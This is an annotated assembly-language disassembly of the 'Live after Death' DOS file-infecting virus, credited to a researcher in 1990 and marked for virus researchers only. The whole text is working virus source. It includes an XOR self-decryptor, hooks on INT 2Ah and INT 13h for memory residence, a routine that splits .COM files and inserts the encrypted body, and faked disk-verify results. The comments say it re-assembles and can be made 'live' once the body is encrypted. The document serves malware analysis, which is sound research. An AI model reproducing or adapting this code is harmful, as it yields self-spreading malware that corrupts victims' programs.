	page	,132
	name	V800
	title	The 'Live after Death' virus
	.radix	16

; ษออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
; บ  Bulgaria, 1404 Sofia, kv. "Emil Markov", bl. 26, vh. "W", ap. 51        บ
; บ  Telephone: Private: (+35-92) 58-62-61, Office: (+35-92) 71-401 ext. 255 บ
; บ									     บ
; บ			   The 'Live after Death' Virus                      บ
; บ		    Disassembled by Vesselin Bontchev, May 1990 	     บ
; บ									     บ
; บ		     Copyright (c) Vesselin Bontchev 1989, 1990 	     บ
; บ									     บ
; บ	 This listing is only to be made available to virus researchers      บ
; บ		   or software writers on a need-to-know basis. 	     บ
; ศออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ

; The disassembly has been tested by re-assembly using MASM 5.0.

code	segment
	assume	cs:code, ds:code

	org	100

timer	equ	46C
v_len	=	v_end-v_entry

start:
	jmp	v_entry 	; JMP to the virus code

	db	900d dup (90)	; The beginning of the infected program

v_entry:			; The virus body begins here
	cli			; Disable interrupts
	xchg	ax,bp		; Save AX

	call	self		; Point SI at the start of the encrypted part
self:
	pop	si		; Get current address
	add	si,19		; (v_start-self) Length of the decryption part

	cld			; Clear direction flag
	mov	di,si		; Point DI at v_start too
	xor	dx,dx		; DX := 0 (the checksum is formed there)
	mov	cx,(v_end-v_start)/2	; The length of the encrypted part
	push	cx		; Save it on stack
do_chksum:			; Compute the checksum of the encrypted part
	lodsw			; Get word
	xor	dx,ax		; ChkSum ^= Word
	loop	do_chksum	; Loop until done
	pop	cx		; Restore length (in words) in CX

; Decrypt the encrypted part. XOR every word of it with the computed checksum.

decrypt:
	xor	[di],dx 	; XOR a word
	inc	di		; Point to the next one
	inc	di
	loop	decrypt 	; Loop until done

; The code beyond this point was encrypted. If this source is
; assembled now, it won't run, since the decryption part will
; scramble it. To produce a 'live' virus, the following code
; must be encrypted "manually" (i.e., with another program)
; after assembly.

v_start:

; Adjust SI to point at v_entry (it currently points at v_end):

	add	si,v_entry-v_end

	mov	bx,sp		; Install a new stack at the
	mov	cl,4		;  program's end - just to be sure
	shr	bx,cl		;  that the original one won't
	inc	bx		;  corrupt the virus
	mov	ax,ss
	add	bx,ax

	mov	cx,v_len/2	; CX := virus length in words
	mov	di,4
	mov	ax,[di-2]	; Get TopMem segment (_psp [2])

	dec	dx		; Subtract 1 from the checksum

	push	ds		; Save DS & checksum on the stack
	push	dx

	mov	dx,ds		; DX := DS

	mov	ds,di		; Check if INT 2Ah is intercepted by a
	cmp	ax,[di+(2A*4+2-(4*10+4))]	;  program at TopMem
	je	in_mem		; Virus present in memory if so

; Virus not in memory. Install it there:

	sub	ah,2		; Reserve 8 K memory (?!)
	cmp	bx,ax		; Enough memory?
	jae	no_mem		; Exit if not
	dec	di		; Point DI at TopMem
	dec	di
	stosw			; Lower TopMem by 8 K

	dec	dx		; Point ES at program's MCB
	mov	es,dx
	sub	byte ptr es:[di],2	; Lower MCB's size by 8 K too

; Install the new INT 2Ah handler. This interrupt (funcrion 82h) is
; called by PC-DOS on every file-related function. Thus, the virus
; gets control without even intercepting INT 21h!

	mov	[di+(2A*4+2-(4*10+4))],ax	; Segment
in_mem:
	mov	word ptr [di+(2A*4-(4*10+4))],int_2A-v_entry	; Offset

	push	ax
	les	bx,[di+(13*4-(4*10+4))] ; Get the current INT 13h handler
	mov	ah,13		; Get the original INT 13h handler
	int	2F		;  (DOS 3.30 only)
	mov	cs:[si+do_it_i+1-v_entry],bx	; Save the found vector as a
	mov	cs:[si+do_it_i+1+2-v_entry],es	;  Far JMP in the virus body
	mov	ah,13		; Restore the internal (DOS) INT 13h handler
	int	2F

	mov	ax,es		; Get INT 13h handler's segment in AX

	push	cs		; DS := CS
	pop	ds

; Compare the segment of the found INT 13h handler with the
; one, stored as a Far JMP. If they match, this means that
; the virus is already present in memory (i.e., loaded for
; a multiple infected file).

	les	bx,[si+do_it_i+1-v_entry]
	cmp	ax,[si+do_it_i+1+2-v_entry]	; Virus already in memory?
	pop	ds		; Restore DS
	pushf			; Save the result of the comparision on stack

	push	ds		; Save DS
	mov	dx,int_13i-v_entry	; Install new internal INT 13h handler
	mov	ah,13		; Do it
	int	2F
	pop	es		; ES := saved DS

	xor	di,di		; DI := 0

	push	si		; Save SI & CX
	push	cx

; Move the virus body in the allocated segment at TopMem:

	rep	movs word ptr es:[di],word ptr cs:[si]

	push	es		; ES := DS
	pop	ds

	mov	[di+0A],cl	; Zero old_op

	pop	cx		; Restore CX & SI
	pop	si

	pop	[di+8]		; flags (i.e. - virus installed)
	pop	[di+6]		; chksum-1

no_mem:
	pop	es		; Clear the stack
	sti			; Enable interrupts

	push	cs		; DS := CS
	pop	ds

	mov	di,offset start-2	; DI := 0FEh
	push	di		; Push this value in the stack
	mov	ax,0A5F3	; Store REP MOVSW there
	stosw
	push	si		; Save SI
	add	si,first3-v_entry	; Point SI at the saved first 3 bytes
	movsw			; Restore the original first 3
	movsb			;  bytes of the file
	pop	di		; DI := saved SI
	lodsw			; Get the offset at which the file was split
	xchg	ax,si		; Put it in SI
	add	si,offset start ; Adjust it with the PSP length
	xchg	ax,bp		; Restore AX (to keep DISKCOPY happy)

; On the top of stack now there is 0FEh. Therefore, the RET instruction
; will transfer the control to the program at this address. And at this
; address there is the REP MOVSW instruction (put there by the virus).
; Therefore, it will restore the second part of the file (split by the
; virus) and will begin to execute it from the beginning (the first 3
; bytes are already restored).

	ret

; Infection routine:

infect:
	push	cx		; Save registers used
	push	dx
	push	si
	push	di
	push	ds
	push	es

	xor	cx,cx		; DS := AX := 0; CX = function
	xchg	ax,cx
	mov	ds,ax

	push	cs		; ES := CS
	pop	es

	mov	di,do_it+1-v_entry	; Install new INT 13h handler
	mov	si,13*4
	mov	ax,int_13-v_entry	; New handler's offset
	xchg	ax,[si]
	stosw			; Save the old one as a Far JMP
	push	ax		; Save it on the stack too

	mov	ax,es		; Do the same with the handler's segment
	xchg	ax,[si+2]
	stosw
	push	ax

	mov	ax,int_24-v_entry	; Install new INT 24h handler
	xchg	ax,[si+24*4-13*4]
	push	ax		; Save the old one on the stack

	mov	ax,es		; Do the same with the handler's segment
	xchg	ax,[si+24*4-13*4+2]
	push	ax

	push	ds		; Save DS & SI (0 and 13*4 respectively)
	push	si

	xor	dl,dl		; Turn Ctrl-Break checking off
	mov	ax,3302 	;  and get the old checking state
	int	21
	push	dx		; Save state on stack

	mov	ax,1220 	; Get system file table number in ES:DI
	int	2F		; Do it
	jc	inf_xit 	; Exit on error

	push	bx		; Save BX
	mov	bl,es:[di]	; Put system file table number in BL
	mov	ax,1216 	; Get address of system FCB in ES:DI
	int	2F		; Do it
	pop	bx		; Restore BX
	jc	inf_xit 	; Exit on error

	mov	si,ds:[timer]	; Load SI with a random value

	push	es		; DS := ES
	pop	ds

	mov	cl,80		; Prepare to test if it's a disk file

	cmp	ch,3E		; Close file operation requested?
	jne	dont_dup	; Don't duplicate handle if so
	mov	ah,45		; Otherwise do it
	int	21
	jc	inf_xit 	; Exit on error
	xchg	ax,bx		; Save handle in BX

; Prepare to test for disk file and wheather file has been written:

	mov	cl,0C0

dont_dup:
	and	cl,[di+5]	; Test the Device Info Word
	jnz	inf_xit 	; Exit if test fails

	xor	dx,dx		; DX := 0

	cmp	dx,[di+13]	; Is file size > 64 K?
	jne	inf_xit 	; Exit if so
	mov	ax,[di+28]	; Get the first 2 bytes of the file extension
	cmp	ax,'XE'         ; .EXE-file?
	je	chk_last	; Go check the last letter too
	cmp	ax,'OC'         ; Maybe it's a .COM-file?
	jne	chk_exec	; If not, try to infect it only on execution
	cmp	ax,[di+20]	; Is this the file "COMM*.CO*"?
	mov	ax,'MM'
	jne	chk_last	; If not, check wheather it really has
	cmp	ax,[di+22]	;  a .COM extension
	je	inf_xit 	; Otherwise exit
chk_last:
	cmp	al,[di+2A]	; Check the last letter of file's extension
	je	chk_len 	; Check the file size if name does match
chk_exec:
	cmp	ch,4Bh		; Exec function requested?
	jne	inf_xit 	; Exit if not

; Check if file length fits in the infectable intervals.
; The infectable intervals are:
;	1024 -	8191	( 0400h -  1FFFh)
;	9216 - 16383	( 2400h -  3FFFh)
;      17408 - 24575	( 4400h -  5FFFh)
;      25600 - 32767	( 6400h -  7FFFh)
;      33762 - 40959	( 8400h -  9FFFh)
;      41984 - 49151	(0A400h - 0BFFFh)
;      50176 - 57343	(0C400h - 0DFFFh)
;      58368 - 64511	(0E400h - 0FBFFh)

chk_len:
	test	byte ptr [di+12],00011100b
	jz	inf_xit 	; Exit if not in an infectable interval
	cmp	byte ptr [di+12],11111100b
	jb	len_ok

inf_xit:			; File not suitable for infection
	jmp	close		; Close it and exit

len_ok:
	mov	ax,[di+11]	; Get file size (from the internal FCB)
	xchg	ax,si		; Put it in SI (the random value is now in AX)
	xchg	al,ah		; "Randomize" it a bit more
	push	si		; Save SI (pointed at file end)

; Compute in DX the random position at which the file will be split:

	sub	si,3
	div	si		; DX := ((f_size - 3) mod rand ()) + 3
	add	dx,3

	lds	si,[di+7]	; Get Device Control Block info
	cmp	byte ptr [si+8],2	; Is the number of FATs >= 2? (?!)
	pop	si		; Restore SI (to point at file end)
	jb	inf_xit 	; Exit if not (only 1 FAT, that is)
	mov	byte ptr es:[di+2],10b	; Set file open mode to writable
	xor	ax,ax
	xchg	ax,es:[di+15]	; Get file position in AX and seek to file beg.
	push	ax		; Save original position on stack

	push	cs		; DS := CS
	pop	ds

	push	dx		; Save computed split position on stack

	mov	dx,first3-v_entry
	mov	cx,3		; Read the first 3 bytes of the file
	mov	ah,3F		;  and save them in the virus body
	int	21		; Do it

	pop	ax		; Restore split position from stack

	jc	xit1		; Exit on error
	mov	es:[di+15],ax	; Seek at split position
	sub	ax,3		; Form a JMP instruction to that position
	mov	ds:[jmp_adr-v_entry],ax ;  at jmp_op

	mov	ax,ds:[first3-v_entry]	; Get the first 2 bytes of the file
	cmp	ax,'ZM'         ; Is it an .EXE-type file?
	je	xit2		; Exit if so
	cmp	ax,'MZ'         ; Double check for .EXE-files
	je	xit2		; Exit if such file

	mov	dx,buffer-v_entry
	mov	cx,v_len	; Read the original (up to v_len)
	mov	ah,3F		;  bytes into the buffer
	int	21		; Do it
xit1:
	jc	xit2		; Exit on error

; Get the number of bytes read in CX and put the virus length in AX:

	xchg	ax,cx

; SI points at file end. Add the virus length to get the new file size:

	add	si,ax

; Now subtract the number of bytes read in, just to compute
; the offset from the beginning of the file, at which the
; second part of the splitted file has to be written:

	sub	si,cx

	mov	es:[di+15],si	; Seek at the computed offset
	mov	ah,40		; Write the original second part of the file
	int	21		; Do it
	jc	xit2		; Exit on error
	sub	ax,cx		; All bytes written?
	jnz	xit2		; Exit on error

	xchg	ax,si		; SI := 0; AX := split position
	mov	ds:[split-v_entry],ax	; Save split position in the virus body
	mov	ax,ds:[jmp_adr-v_entry] ; Get the computed new JMP address
	add	ax,3
	mov	es:[di+15],ax	; And seek to that address in the file

	push	dx		; Save DX (currently points at the buffer area)
	xor	dx,dx		; DX := 0 (the checsum is formed there)
	mov	cx,v_len/2	; Virus length in words

; Compute the new checksum of the virus and use it to encrypt the virus:

encrypt:
	lodsw			; Get a word from the virus body
	db	81, 0FE, 20, 0	; I was unable to make MASM generate this (?!)
;	cmp	si,v_start-self+1
	jb	no_crypt	; Don't encrypt the decryption part
	xor	ax,ds:[chksum-v_entry]	; Compute the checksum
	xor	dx,ax
no_crypt:
	mov	word ptr [si+(data_1-v_entry)],ax	; Encrypt with it
	loop	encrypt 	; Loop until done

	xor	dx,ds:[chksum-v_entry]	; Save the checksum
	xor	[si+2F3],dx	; (?!)
	pop	dx		; Restore DX (to point to the buffer area)

	mov	cx,v_len	; Write the virus body in the file
	mov	ah,40
	int	21		; Do it
	jc	xit2		; Exit on error
	sub	ax,cx		; All bytes written?
	jnz	xit2		; Exit on error

	mov	es:[di+15],ax	; Seek to file beginning (AX == 0 now)

	mov	dx,jmp_op-v_entry
	mov	cx,3		; Overwrite the first 3 bytes of the file
	mov	ah,40		;  with a JMP to the virus code
	int	21		; Do it

xit2:
	pop	word ptr es:[di+15]	; Restore file position
	or	byte ptr es:[di+6],40	; Set 'File Modified' bit

close:
	mov	ah,3E		; Close the file
	int	21

	pop	dx		; Restore Ctrl-Break state from stack
	mov	ax,3301 	; Set old Ctrl-Break state
	int	21

	pop	si		; Restore SI & DS (13*4 and 0 respectively)
	pop	ds

	pop	word ptr [si+24*4+2-13*4]	; Restore the old
	pop	word ptr [si+24*4-13*4] ;  INT 24h handler
	pop	word ptr [si+2] ; Restore the old INT 13 handler
	pop	word ptr [si]

	pop	es		; Restore used registers
	pop	ds
	pop	di
	pop	si
	pop	dx
	pop	cx
	ret			; Done. Exit

; New INT 2Ah, subfunction 82h handler. DOS calls
; this function on every file-related operation.

int_2A:
	push	si		; Save registers used
	push	di
	push	bp
	push	ds
	push	es

	mov	bp,sp
	cmp	ah,82		; Function 82h?
	jne	int2A_xit	; Exit if not
	mov	ax,ds		; Is the current DS equal to caller's CS?
	cmp	ax,[bp+0C]
	jne	int2A_xit	; Exit if not

	mov	si,[bp+0A]	; Get the byte at caller's CS:IP
	lodsb
	cmp	al,0CC		; Is it an INT3 instruction?
	je	int2A_xit	; Exit if so

	mov	ax,1218 	; Get caller's registers
	int	2F
	les	di,[si+12]	; CS:IP, more exactly
	cmp	byte ptr es:[di],0CC	; Is there an INT3 instruction?
	je	int2A_xit	; Exit if so

	mov	ax,cs		; Called from the current segment
	cmp	ax,[si+14]	;  (i.e., from the virus)?
	je	int2A_xit	; Exit if so

	cmp	word ptr es:[di-2],21CDh	; Called from INT 21h?
	jne	int2A_xit	; Exit if not

	push	cs		; ES := CS
	pop	es

	mov	di,v_len	; Point ES:DI at virus length
	lodsw			; Get caller's AX
	mov	bp,ax		; Save it in BP
	sub	ah,3Dh		; Open file handle function requested?
	je	ok4inf		; OK for infection if so
	dec	ah		; Close file function requested?
	je	ok4inf		; OK for infection if so
	sub	ah,0Dh		; Exec function requested?
	jne	int2A_xit	; Exit if not
	cmp	al,2		; Subfunctions 0 or 1?
	jae	int2A_xit	; Exit if not

; Now AH == 0. Check to see if count (ES:[DI-3E]) is zero too.
; If it's not, that would mean that this file handle belongs
; to an already infected by the virus file.

ok4inf:
	cmp	ah,es:[di-3E]	; Is count equal to zero?
	mov	cs:[di-3E],ah	; Zero count
	jne	int2A_xit	; Exit if not
	mov	bl,0C2		; Othewise scramble BX (?!)

; Get the caller's CS:IP and save them as a Far JMP (just at v_end).
; Also, modify them to point at the program at loc_1. In this way,
; when the INT 2Ah handler terminates, the program at loc_1 will
; receive control. It will (eventually) infect the file and then
; perform a Far JMP to the place, where INT 2Ah was called.

	mov	ax,loc_1-v_entry	; Offset
	xchg	ax,[si+10]	; Shouldn't it be [si+14]? (?!)
	dec	ax
	dec	ax
	stosw
	mov	ax,cs		; Segment
	xchg	ax,[si+12]
	stosw

	xchg	ax,bp		; Restore AX from BP
	stosw			; And save it in old_ax

int2A_xit:
	pop	es		; Restore used registers
	pop	ds
	pop	bp
	pop	di
	pop	si

; New INT 24h handler. Just terminate; AH
; already contains the suggested action.

int_24:
	iret			; End of INT 2Ah and INT 24h handlers

int_13i:			; New internal INT 13h handler
	cmp	byte ptr cs:[old_op-v_entry],0	; Iterrupt called from virus?
	je	do_it_i 	; If not, just perform it "as is"
	xor	ah,ah		; Else zero the old_op flag and call the
	xchg	ah,byte ptr cs:[old_op-v_entry] ; interrupt with the true value
do_it_i:
	db	0EA, 71, 0A9, 0, 0F0	; Far JMP to old intern INT 13h handler

int_13: 			; New INT 13h handler
	mov	byte ptr cs:[old_op-v_entry],ah
	cmp	ah,4		; VERIFY operation specified?
	je	verify		; Return OK without performing it
	cmp	ah,3		; WRITE operation requested?
	jne	do_it		; Just execute the old handler if not
	push	cs:[flags-v_entry]
	popf			; What was the flags state?
	jz	do_it_i 	; Execute operation if flags OK
	dec	ah		; Otherwise fake a READ operation
do_it:
	db	0EA, 1F, 1Dh, 70, 0	; Far JMP to old INT 13h handler
verify:
	sub	ax,ax		; Return 'No errors' (AX == 0 && CF == 0)
	sti			; Enable interrupts
	retf	2		; Done. Exit

count	db	1		; Counter how many times the file is infected
first3	db	0E9, 0F8, 3	; The first 3 bytes of the file
split	dw	6A7		; Address at which the file was split
	dw	46BC		; (?!)
jmp_op	db	0E9		; Here a JMP to the virus code is formed
jmp_adr dw	384		; The addres at which is JMPed

	db	0, 'Live after Death', 0

loc_1:
	pushf			; Save Flags
	cli			; Disable interrupts
	push	bx		; Save BX
	cld			; Clear direction flag
	inc	byte ptr cs:[count-v_entry]	; Increment infection counter
	cmp	ah,3E		; CLOSE function call?
	je	do_inf		; Just infect file if so
	xchg	ax,bx		; Otherwise get handle in BX
	mov	ax,3D00 	; Open the file for Reading only
	int	21
	jc	dont_inf	; Don't infect if an error occured
	xchg	ax,bx		; Get handle in BX
do_inf:
	call	infect		; Infect the file
dont_inf:
	mov	ax,cs:[old_ax-v_entry]	; Restore caller's AX
	pop	bx		; Restore BX
	popf			; Restore Flags

; Here is formed a Far JMP to the program, which called INT 2Ah, function 82h:

	db	0EA

v_end	equ	$		; End of virus code
old_ax	equ	v_end+4 	; Place to store caller's AX
chksum	equ	old_ax+2	; Here a checksum is formed for encryption
flags	equ	chksum+2	; Flag
data_1	equ	flags+1 	; (?!)
old_op	equ	data_1+1	; The last INT 13h operation
buffer	equ	old_op+1	; Program I/O buffer

	db	116d dup (90)	; The second part of the infected program

	mov	ax,4C00 	; Exit program
	int	21

code	ends
	end	start

